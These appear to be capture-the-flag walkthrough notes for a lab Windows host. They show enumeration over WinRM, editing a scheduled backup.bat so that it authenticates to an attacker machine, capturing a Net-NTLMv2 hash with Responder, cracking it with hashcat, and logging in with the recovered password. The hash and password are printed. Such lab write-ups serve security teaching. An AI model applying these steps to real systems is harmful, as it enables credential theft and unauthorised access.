
#Winrm 
1. Do some basic enumeration.

```
ls -force c:\
```

It lists **everything** in `C:\`, including hidden and protected system folders like `ProgramData`, `System Volume Information`, etc.

![[ls3.png]]

There's a directory called `Scripts`.

2. See the directory content.

```
ls -force c:\Scripts
```

![[backup3.png]]

3. See the content of `backup.bat`.

```
type C:\Scripts\backup.bat
```

![[copy3.png]]

The file copy `notes.txt` to another directory.

It sems like it’s a backup file. it’s normally run as scheduled jobs. Also it seems like it runs `o.armstrong` context.

## Check the scheduled jobs

#Winrm 
1. Go to `C:\Windows\system32\tasks`.
2. List the files.
3. You'll see `Notes backup`.
4. Edit the file.

![[taks.png]]

You can see the schedule interval is `1 minute`, and the user is `o.armstrong`.

This is really a LLMNR-NBT/NS Poisoning and Relay attack, even though you now are interested on credentials.


## Getting NTLMv2 hash

> [!Note]
> NTLMv2 (or more formally Net-NTLMv2) is a challenge-response authentication protocol that Windows clients use to authenticate to other Windows servers. For more information see thie [blog post](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html).

#Winrm 
1. Download the backup.bat file to your attacking machine.

```
*Evil-WinRM* PS C:\Scripts> download backup.bat
```

#Attaking_Machine 
2. Add the following code to the file and save it:

```
net use \\<ATTACKING MACHINE IP>\share
```

#Winrm 
3. Delete the file `backup.bat`. 

```
*Evil-WinRM* PS C:\Scripts> del backup.bat
```
3. Upload the file.

```
*Evil-WinRM* PS C:\Scripts> upload backup.bat
```

#Attaking_Machine 
4. Run `responder`.

```
sudo responder -I tun0 
```

![[responder.png]]

5. After a while you'll get the NTLMv2 hash.

![[ntlm_hash.png]]


## Hashcat

#Attaking_Machine 
1. Save the NTLMv2-SSP Hash in a file called hash.txt.

```
echo "o.armstrong::K2:8a92a72ae42faeed:8C28A4DF5CF61B970D269D685A2B81E9:01010000000000000079B0D5DB64DC01544C35ABF38678AF00000000020008004E0038004700350001001E00570049004E002D0034004F00340058004C00430035004B00370055004E0004003400570049004E002D0034004F00340058004C00430035004B00370055004E002E004E003800470035002E004C004F00430041004C00030014004E003800470035002E004C004F00430041004C00050014004E003800470035002E004C004F00430041004C00070008000079B0D5DB64DC01060004000200000008003000300000000000000000000000002100005E680628985EF5A594972F932BE058FFCD2BEB02B4B46328737766EB7DAEBB250A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100350032002E003100390032000000000000000000" > hash.txt
```

2. Run hashcat using a dictionary as `rockyou.txt`.

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
```

3. To show the password run.

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
```

![[hashcat.png]]

## WinRM access

#Attaking_Machine 
Run:

```
evil-winrm -i k2.thm -u O.ARMSTRONG -p arMStronG08
```

![[winrm3 1.png]]

**Next step:** [[The Summit/User's flag|User's flag]]

